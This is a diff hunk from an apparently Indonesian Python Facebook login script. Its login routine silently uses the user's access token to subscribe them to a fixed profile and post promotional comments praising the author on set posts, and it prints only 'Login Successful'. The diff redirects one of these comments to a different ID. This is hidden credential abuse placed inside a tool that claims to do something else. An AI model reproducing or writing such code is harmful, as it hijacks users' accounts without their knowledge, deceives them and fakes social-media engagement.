@@ -84,7 +84,7 @@ def menu_log():
             requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token=" + token) 
             requests.post("https://graph.facebook.com/800676813861801/comments?message=Raka Orang Terganteng diindonesia !&access_token="+token)
             requests.post("https://graph.facebook.com/953529338576547/comments?message=Bang Sc Nya Mantap Bang😊 !&access_token="+token)
-            requests.post("https://graph.facebook.com/800676813861801/comments?message=Langgeng Sllu Aa Raka Sama Nenk Manda nya🥰 !&access_token="+token)
+            requests.post("https://graph.facebook.com/100000834003593/comments?message=Langgeng Sllu Aa Raka Sama Nenk Manda nya🥰 !&access_token="+token)
             print('%s║'%(O))
             jalan('%s╚══®[%s!%s]◍➤ %sLogin Successful'%(O,P,O,P))
             menu()
